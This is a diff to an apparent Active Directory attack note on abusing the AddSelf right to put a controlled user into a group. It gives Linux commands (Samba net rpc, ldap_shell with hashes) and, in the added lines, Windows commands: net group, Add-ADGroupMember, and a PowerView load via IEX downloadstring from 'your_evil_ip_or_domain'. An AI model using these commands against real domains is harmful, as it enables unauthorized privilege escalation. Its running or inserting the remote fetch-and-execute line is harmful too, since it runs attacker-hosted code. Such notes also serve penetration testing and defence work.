@@ -2,7 +2,7 @@
 
 If an user have AddSelf over a group can add itself inside the group. This can be done with multiple tools.
 
-### From Linux (enternally):
+### From Linux (enternally recomended):
 
 Samba tools -> `net rpc group addmem '<target_group>' '<target_user>' -U '<domain>'/'<controlled_user>'%'<password>' -S '<dc-ip>'`
 
@@ -27,6 +27,18 @@ Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes fffffffffffffffffffffffffff
 <br>
 
 ### From Windows (internally):
+
+`net group <group> <user> /add /domain`
+
+Additionally can be done with Active directory module (powershell module):
+
+`Add-ADGroupMember -Identity '<group>' -Members '<user>'`
+
+Also is possible with powerview module:
+
+Load module -> `IEX (new-object net.webclient).downloadstring('http://your_evil_ip_or_domain/powerview.ps1')`
+
+`Add-DomainGroupMember -Identity '<group>' -Members '<user>'`
 
 
 
